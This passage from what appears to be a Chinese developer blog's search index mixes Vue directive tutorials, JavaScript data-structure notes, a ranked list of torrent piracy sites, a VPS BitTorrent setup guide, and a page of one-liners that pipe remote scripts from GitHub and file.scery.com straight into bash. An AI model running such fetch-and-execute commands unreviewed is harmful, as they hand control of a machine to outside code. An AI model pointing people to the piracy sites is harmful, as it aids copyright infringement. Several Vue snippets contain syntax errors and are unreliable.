class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><blockquote><p>v-if指令的作用是：根据表达式的真假切换元素的显示状态</p><p>本质是通过操纵dom元素来切换显示状态</p><p>表达式的值为true，元素存在于dom树种，为false，从dom树中移除</p></blockquote><ul><li><h3 id="v-bind"><a href="#v-bind" class="headerlink" title="v-bind"></a>v-bind</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.abc</span>&#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">border</span>: <span class="number">1px</span> solid red;</span></span><br><span class="line"><span class="language-css"> &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> @<span class="attr">onclick</span>=<span class="string">&quot;show&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">v-bind:src</span>=<span class="string">&quot;imgSrc&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">v-bind:title</span>=<span class="string">&quot;imgtitle&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">v-bind:class</span>=<span class="string">&quot;ifShowClass:&#x27;classname&#x27;:&#x27;&#x27;&quot;</span>&gt;</span>//三目运算符方式</span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">v-bind:class</span>=<span class="string">&quot;&#123;classname:ifShowClass&#125;&quot;</span>&gt;</span>//对象方式</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">imgSrc</span>:<span class="string">&quot;./图片地址&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">imgtitle</span>:<span class="string">&quot;图片名称&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">ifShowClass</span>:<span class="literal">false</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">classname</span>:<span class="string">&quot;abc&quot;</span></span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">show</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">ifShowClass</span> =!<span class="variable language_">this</span>.<span class="property">ifShowClass</span>; </span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><blockquote><h3 id="v-bind指令的作用是：为元素绑定属性"><a href="#v-bind指令的作用是：为元素绑定属性" class="headerlink" title="v-bind指令的作用是：为元素绑定属性"></a>v-bind指令的作用是：为元素绑定属性</h3><h3 id="完整的写法是-v-bind-属性名"><a href="#完整的写法是-v-bind-属性名" class="headerlink" title="完整的写法是 v-bind:属性名"></a>完整的写法是 <u><strong>v-bind:属性名</strong></u></h3><h3 id="简写的话可以直接省略v-bind，只保留-属性名"><a href="#简写的话可以直接省略v-bind，只保留-属性名" class="headerlink" title="简写的话可以直接省略v-bind，只保留 :属性名"></a>简写的话可以直接省略v-bind，只保留 <strong><u>:属性名</u></strong></h3><h3 id="需要动态的增删ckass建议使用对象的方式"><a href="#需要动态的增删ckass建议使用对象的方式" class="headerlink" title="需要动态的增删ckass建议使用对象的方式"></a>需要动态的增删ckass建议使用对象的方式</h3></blockquote><ul><li><h3 id="v-for"><a href="#v-for" class="headerlink" title="v-for"></a>v-for</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;item in arr&quot;</span>&gt;</span>第&#123;&#123;index+1&#125;&#125;个是&#123;&#123;item&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span>//跟for in里面的索引不同</span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(item,index) in arr1&quot;</span>&gt;</span>&#123;&#123;index&#125;&#125;今年&#123;&#123;item.name&#125;&#125;岁了<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">arr</span>:[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="string">&quot;d&quot;</span>,<span class="string">&quot;e&quot;</span>],<span class="comment">//数组</span></span></span><br><span class="line"><span class="language-javascript">    <span class="attr">arr1</span>:[&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="string">&quot;小明&quot;</span>:<span class="number">13</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="string">&quot;小绿&quot;</span>:<span class="number">15</span></span></span><br><span class="line"><span class="language-javascript">    &#125;]<span class="comment">//对象数组</span></span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><blockquote><h3 id="v-for指令的作用是：根据数据生成列表结构"><a href="#v-for指令的作用是：根据数据生成列表结构" class="headerlink" title="v-for指令的作用是：根据数据生成列表结构"></a>v-for指令的作用是：根据数据生成列表结构</h3><h3 id="数组经常和v-for结合使用"><a href="#数组经常和v-for结合使用" class="headerlink" title="数组经常和v-for结合使用"></a>数组经常和v-for结合使用</h3><h3 id="语法是-item-index-in-数据"><a href="#语法是-item-index-in-数据" class="headerlink" title="语法是(item,index) in 数据"></a>语法是<strong><u>(item,index) in 数据</u></strong></h3><h3 id="item和index可以结合其他指令一起使用"><a href="#item和index可以结合其他指令一起使用" class="headerlink" title="item和index可以结合其他指令一起使用"></a>item和index可以结合其他指令一起使用</h3></blockquote><ul><li><h3 id="v-on补充"><a href="#v-on补充" class="headerlink" title="v-on补充"></a>v-on补充</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;lalala(1,2)&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> @<span class="attr">keyup:enter</span>=<span class="string">&quot;test&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">lalala</span>: <span class="keyword">function</span>(<span class="params">p1,p2</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(p1);</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(p2);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">test</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">alert</span>(<span class="string">&quot;test&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><blockquote><h3 id="事件绑定的方法写成函数调用的形式，可以传入自定义参数"><a href="#事件绑定的方法写成函数调用的形式，可以传入自定义参数" class="headerlink" title="事件绑定的方法写成函数调用的形式，可以传入自定义参数"></a>事件绑定的方法写成函数调用的形式，可以传入自定义参数</h3><h3 id="定义方法是需定义形参来接收传入的实参"><a href="#定义方法是需定义形参来接收传入的实参" class="headerlink" title="定义方法是需定义形参来接收传入的实参"></a>定义方法是需定义<strong><u>形参</u></strong>来接收传入的实参</h3><h3 id="事件的后面跟上-修饰符-可以对事件进行限制"><a href="#事件的后面跟上-修饰符-可以对事件进行限制" class="headerlink" title="事件的后面跟上 .修饰符 可以对事件进行限制"></a>事件的后面跟上 <strong><u>.修饰符</u></strong> 可以对事件进行限制</h3><h3 id="enter-可以限制触发的按键为回车"><a href="#enter-可以限制触发的按键为回车" class="headerlink" title=".enter 可以限制触发的按键为回车"></a><u><strong>.enter</strong></u> 可以限制触发的按键为回车</h3><h3 id="事件修饰符有很多种，具体更多详情请看文档-Https-cn-vuejs-org-v2-api-v-on"><a href="#事件修饰符有很多种，具体更多详情请看文档-Https-cn-vuejs-org-v2-api-v-on" class="headerlink" title="事件修饰符有很多种，具体更多详情请看文档 Https://cn.vuejs.org/v2/api/@v-on"></a>事件修饰符有很多种，具体更多详情请看文档 Https://cn.vuejs.org/v2/api/@v-on</h3></blockquote><ul><li><h3 id="v-model"><a href="#v-model" class="headerlink" title="v-model"></a>v-model</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;message&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">message</span>:<span class="string">&quot;nihaoa&quot;</span></span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><blockquote><h3 id="v-model指令的作用是便捷的设置和获取表单元素的值"><a href="#v-model指令的作用是便捷的设置和获取表单元素的值" class="headerlink" title="v-model指令的作用是便捷的设置和获取表单元素的值"></a>v-model指令的作用是便捷的设置和获取表单元素的值</h3><h3 id="绑定的数据会和表单元素值相关联"><a href="#绑定的数据会和表单元素值相关联" class="headerlink" title="绑定的数据会和表单元素值相关联"></a>绑定的数据会和表单元素值相关联</h3><h3 id="绑定的数据⬅️➡️表单元素的值"><a href="#绑定的数据⬅️➡️表单元素的值" class="headerlink" title="绑定的数据⬅️➡️表单元素的值"></a>绑定的数据⬅️➡️表单元素的值</h3></blockquote>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> Vue框架 </category>
          
          <category> 入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> Vue框架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Top_BTWebsite</title>
      <link href="/Top-BTWebsite.htm"/>
      <url>/Top-BTWebsite.htm</url>
      
        <content type="html"><![CDATA[<h2 id="1、海盗湾"><a href="#1、海盗湾" class="headerlink" title="1、海盗湾"></a>1、海盗湾</h2><p>网址：<a href="https://thepiratebay.org/">https://thepiratebay.org/</a></p><p>海盗湾建站至今超过 16 年，仍在继续运营。在经历了 2018 年的严重停机事故之后，去年表现相对平稳。该网站几个月前关闭了新用户注册，但仍向公众开放。它仍在使用 .org 域名，但不确定将来是否会如此。</p><h2 id="2、YTS-lt"><a href="#2、YTS-lt" class="headerlink" title="2、YTS.lt"></a>2、YTS.lt</h2><p>网址: <a href="https://yts.lt/">https://yts.lt/</a></p><p>这个网站是原 YTS/YIFY 的非官方继任者。该网站侧重于全球热门的电影发布。YTS 最近成为美国三起诉讼的被告，虽然运营商签署同意了判决，向一名电影制作人支付损害赔偿金，但该网站仍处于在线状态。</p><h2 id="3、1337X"><a href="#3、1337X" class="headerlink" title="3、1337X"></a>3、1337X</h2><p>网址：<a href="https://1337x.to/">https://1337x.to/</a></p><p>1337X 保住了前三的位子，与其他一些网站不同的是，它有一群忠实的 up 主，每天都会提供新种子。</p><h2 id="4、RARBG"><a href="#4、RARBG" class="headerlink" title="4、RARBG"></a>4、RARBG</h2><p>网址：<a href="https://rarbg.to/">https://rarbg.to/</a></p><p>在过去的一年里，RARBG 一直保持稳定运营。RARBG 成立于 2008 年，该站在高清电影和电视剧方面更新速度较快。该站有多个域名，这里选取访问量最大的域名进行排名。</p><h2 id="5、NYAA-si"><a href="#5、NYAA-si" class="headerlink" title="5、NYAA.si"></a>5、NYAA.si</h2><p>网址：<a href="https://nyaa.si/">https://nyaa.si/</a></p><p>NYAA.si 是知名动漫 BT 站 NYAA 关站重生后的网站。虽然有来自其他 BT 站的激烈竞争，但 NYAA 表现良好，与去年排名相比上升了一位。</p><h2 id="6、Torrentz2"><a href="#6、Torrentz2" class="headerlink" title="6、Torrentz2"></a>6、Torrentz2</h2><p>网址：<a href="https://torrentz2.eu/">https://torrentz2.eu/</a></p><p>Torrentz2 是 Torrentz.eu 的替代网站，Torrentz.eu 网站于 2016 年自愿关闭。该网站没有存储任何种子文件，但仍然是一个很受欢迎的种子搜索引擎。</p><h2 id="7、EZTV-io"><a href="#7、EZTV-io" class="headerlink" title="7、EZTV.io"></a>7、EZTV.io</h2><p>网址：<a href="https://eztv.io/">https://eztv.io/</a></p><p>最初的电视剧发布组 EZTV 在 2015 年被恶意收购后关站，新所有者声称拥有该品牌。该组织去年改用了一个新域名，由于与海盗湾（Pirate Bay）共用了 IP 地址，因此无意中被荷兰封锁屏蔽。</p><h2 id="8、LimeTorrents"><a href="#8、LimeTorrents" class="headerlink" title="8、LimeTorrents"></a>8、LimeTorrents</h2><p>网址：<a href="https://www.limetorrents.info/">https://www.limetorrents.info/</a></p><p>LimeTorrents 已经有十多年的历史了。跟这个榜单中的其他网站一样，被世界各地的 ISP 封锁，在一定程度上影响了整体访问流量。</p><h2 id="9、Fitgirl-Repacks"><a href="#9、Fitgirl-Repacks" class="headerlink" title="9、Fitgirl Repacks"></a>9、Fitgirl Repacks</h2><p>网址：<a href="https://fitgirl-repacks.site/">https://fitgirl-repacks.site/</a></p><p>FitGirl Repacks 绝不是一个传统的 BT 站。它是一个游戏发布组的网站，它发布热门游戏的精简破解版，从而将下载时间降至最低。他们在其他网站上发布种子，但也提供他们自己的磁力链接，这就是为什么我们在这里加入这个网站的原因。</p><h2 id="10、Tamil-Rockers"><a href="#10、Tamil-Rockers" class="headerlink" title="10、Tamil Rockers"></a>10、Tamil Rockers</h2><p>网址：<a href="https://tamilrockers.ws/">https://tamilrockers.ws/</a></p><p>TamilRockers 在印度非常出名，并设有基地。由于它有英文版本，该网站在全球范围内都有使用。尽管印度发起过几次执法行动，并逮捕了涉嫌的管理员和操作员，但该网站仍在蓬勃发展。</p>]]></content>
      
      
      <categories>
          
          <category> BT </category>
          
          <category> Download </category>
          
          <category> movies </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Download </tag>
            
            <tag> BT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vps_BTdownload</title>
      <link href="/vps-BTdownload.htm"/>
      <url>/vps-BTdownload.htm</url>
      
        <content type="html"><![CDATA[<p>在vps的选取上应该注意以下几点：</p><ol><li>硬盘足够大，如果你选个只有5G硬盘大小的vps，估计你也下不了什么；</li><li><strong>vps提供商允许bt</strong> ，这点很重要，部分国家对版权问题零容忍。在购买vps前一定要仔细看看TOS,看是否允许BT下载；</li></ol><p>例如ramnode的 <code>Acceptable Use Policy</code> 中有写有：</p><figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">The following are acceptable uses provided they comply with the rest of this AUP:</span><br><span class="line"><span class="comment">* IRC*</span></span><br><span class="line"><span class="comment">* Source games+</span></span><br><span class="line"><span class="comment">* Minecraft servers+</span></span><br><span class="line"><span class="comment">* VPN</span></span><br><span class="line"><span class="comment">* Adult material</span></span><br><span class="line"><span class="comment">* Video streaming</span></span><br><span class="line"><span class="comment">* Torrents (Only allowed in US locations - must be limited to 20Mbps total)</span></span><br><span class="line"><span class="comment">* Usenet (Must be limited to 20Mbps total)</span></span><br><span class="line"><span class="comment">*Any usage which results in any attacks against RamNode the company (not just the client’s VPS) may result in suspension and/or termination.</span></span><br><span class="line">+Game servers are <span class="keyword">not</span> allowed on Massive plans (CVZ <span class="keyword">and</span> CKVM).</span><br></pre></td></tr></table></figure><p>倒数第二条，写道： <code>在美国的vps允许限速20M的Torrents</code></p><h3 id="2-BT软件安装"><a href="#2-BT软件安装" class="headerlink" title="2.BT软件安装"></a>2.BT软件安装</h3><p>BT客户端为 <code>deluge</code> ，deluge提供了 <strong>web-ui</strong> 管理，方便管理操作</p><p>ubuntu上使用PPA的方式安装:</p><figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">sudo<span class="built_in"> add-apt-repository </span>ppa:deluge-team/ppa</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install deluge deluge-web</span><br></pre></td></tr></table></figure><p>其他 <a href="http://www.codercto.com/category/linux.html">linux</a> 发行版本的安装方式可以参考 <a href="http://dev.deluge-torrent.org/wiki/Download">官方文档</a></p><p>安装完成后通过启动 <code>deluge</code> ：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">deluge-web <span class="attr">--ssl</span> -<span class="selector-tag">p</span> <span class="number">8080</span> &amp;</span><br></pre></td></tr></table></figure><p>这里 <code>--ssl</code> 指开启ssl访问， <code>8080</code> 是指访问端口，这时只需要访问 <code>https://ip:8080</code> 就可以看到 <code>deluge</code> 的web管理界面了，deluge的 <strong>默认密码</strong> 为 <code>deluge</code> ，进入后记得 <strong>及时修改密码</strong></p><p>然后连接deluge服务:</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/FJVjInI.png!web" alt="利用vps搭建BT离线下载"></p><p>到这里BT服务端基本就搭建完毕了， <strong>记得给deluge的上传和下载限速20M</strong></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> BT Download Server </category>
          
          <category> build </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> BT Download Server </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>proxyvps_tool</title>
      <link href="/proxyvps-tool.htm"/>
      <url>/proxyvps-tool.htm</url>
      
        <content type="html"><![CDATA[<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">wget git.io/vpstest &amp;&amp; bash vpstest</span><br><span class="line">wget -qO- --no-check-certificate https:<span class="regexp">//</span>raw.githubusercontent.com<span class="regexp">/oooldking/</span>script<span class="regexp">/master/</span>superbench.sh | bash</span><br><span class="line">wget -qO- sb.oldking.net | bash</span><br><span class="line">wget -qO- bench.sh | bash</span><br><span class="line"><span class="regexp">//</span>到国内的速度</span><br></pre></td></tr></table></figure><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">wget <span class="string">&quot;https://github.com/chiakge/Linux-NetSpeed/raw/master/tcp.sh&quot;</span> &amp;&amp; chmod +x tcp.<span class="keyword">sh</span> &amp;&amp; ./tcp.<span class="keyword">sh</span></span><br><span class="line"><span class="comment">//BBR锐速三合一脚本</span></span><br></pre></td></tr></table></figure><figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">wget -qO- git.io/besttrace <span class="string">| bash</span></span><br><span class="line"><span class="comment">//traceroute回程</span></span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">wget -O speedtest-cli https:<span class="regexp">//</span>raw.githubusercontent.com<span class="regexp">/sivel/</span>speedtest-cli<span class="regexp">/master/</span>speedtest.py</span><br><span class="line">chmod +x speedtest-cli</span><br><span class="line"><span class="regexp">//</span>speedtest</span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">bash &lt;(curl -s -L https:<span class="comment">//git.io/v2ray.sh)</span></span><br><span class="line">forever stop <span class="selector-tag">main</span><span class="selector-class">.js</span></span><br><span class="line">rm -rf <span class="selector-tag">main</span><span class="selector-class">.js</span></span><br><span class="line">forever start anthonysclientmain<span class="selector-class">.js</span></span><br><span class="line"><span class="comment">//V2</span></span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment"># for centos</span></span><br><span class="line">bash &lt;(curl -Ls https:<span class="regexp">//gi</span>thub.com<span class="regexp">/mzz2017/</span>lkl-haproxy<span class="regexp">/raw/m</span>aster/lkl-haproxy-centos-nocheckvirt.sh)</span><br><span class="line"></span><br><span class="line"><span class="comment"># for debian</span></span><br><span class="line">bash &lt;(curl -Ls https:<span class="regexp">//gi</span>thub.com<span class="regexp">/mzz2017/</span>lkl-haproxy<span class="regexp">/raw/m</span>aster/lkl-haproxy-debian-nocheckvirt.sh)</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>openvz bbr</span><br></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">wget -U <span class="string">&quot;wocaonima&quot;</span> https://<span class="keyword">file</span>.scery.<span class="keyword">com</span>/nginx.<span class="keyword">sh</span> &amp;&amp; chmod +<span class="keyword">x</span> nginx.<span class="keyword">sh</span> &amp;&amp; ./nginx.<span class="keyword">sh</span></span><br><span class="line">wget -U <span class="string">&quot;wocaonima&quot;</span> https://<span class="keyword">file</span>.scery.<span class="keyword">com</span>/installpanelcilent.<span class="keyword">sh</span> &amp;&amp; chmod +<span class="keyword">x</span> installpanelcilent.<span class="keyword">sh</span> &amp;&amp; ./installpanelcilent.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> vps </category>
          
          <category> proxy </category>
          
          <category> shell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> ops </tag>
            
            <tag> proxy </tag>
            
            <tag> fasttest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javascript-gather</title>
      <link href="/javascript-gather.htm"/>
      <url>/javascript-gather.htm</url>
      
        <content type="html"><![CDATA[<h1 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h1><h4 id="集合是什么？"><a href="#集合是什么？" class="headerlink" title="集合是什么？"></a>集合是什么？</h4><ul><li>集合有三个特点<pre><code>- 无重复性 -不能重复key,每个元素都唯一- 空集 - &#123;&#125;- 子集</code></pre></li></ul><p>Object.prototype.xxxx</p><p>Object是一个大写开头的，就是一个构造器，也就是一个函数，也是对象的一种，也有自己的属性和方法，他可以继承给自己的子类</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/image-20200509223633857.png" alt="image-20200509223633857"></p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/image-20200509223929866.png" alt="image-20200509223929866"></p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/image-20200509224443594.png" alt="image-20200509224443594"></p>]]></content>
      
      
      <categories>
          
          <category> 代码 </category>
          
          <category> JavaScript </category>
          
          <category> 算法 </category>
          
          <category> 链表 </category>
          
          <category> 集合 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码 </tag>
            
            <tag> JavaScript </tag>
            
            <tag> 算法 </tag>
            
            <tag> 集合 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javascript-circular-linkedlist</title>
      <link href="/javascript-circular-linkedlist.htm"/>
      <url>/javascript-circular-linkedlist.htm</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 代码 </category>
          
          <category> JavaScript </category>
          
          <category> 算法 </category>
          
          <category> 链表 </category>
          
          <category> 循环链表 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码 </tag>
            
            <tag> JavaScript </tag>
            
            <tag> 算法 </tag>
            
            <tag> 循环链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javascript-Double_linkedlist</title>
      <link href="/javascript-Double-linkedlist.htm"/>
      <url>/javascript-Double-linkedlist.htm</url>
      
        <content type="html"><![CDATA[<h1 id="双向链表"><a href="#双向链表" class="headerlink" title="双向链表"></a>双向链表</h1><h4 id="双向链表结构"><a href="#双向链表结构" class="headerlink" title="双向链表结构:"></a>双向链表结构:</h4><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/72678-20160921234735277-690841292.png" alt="img"></p><h3 id="先在Html引入js文件"><a href="#先在Html引入js文件" class="headerlink" title="先在Html引入js文件:"></a>先在Html引入js文件:</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;TEST&lt;/title&gt;</span><br><span class="line">    &lt;script src=&quot;./04_双向链表.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="双向链表-js"><a href="#双向链表-js" class="headerlink" title="双向链表.js"></a>双向链表.js</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title class_">LinkedList</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> head = <span class="literal">null</span></span><br><span class="line">    <span class="keyword">let</span> length = <span class="number">0</span></span><br><span class="line">    <span class="comment">//定义一个辅助节点类</span></span><br><span class="line">    <span class="keyword">let</span> <span class="title class_">Node</span> = <span class="keyword">function</span>(<span class="params">element</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">previous</span> = <span class="literal">null</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">element</span> = element</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">next</span> = <span class="literal">null</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//在链表后面追加</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">append</span> = <span class="keyword">function</span>(<span class="params">element</span>)&#123;</span><br><span class="line">        <span class="keyword">let</span> node = <span class="keyword">new</span> <span class="title 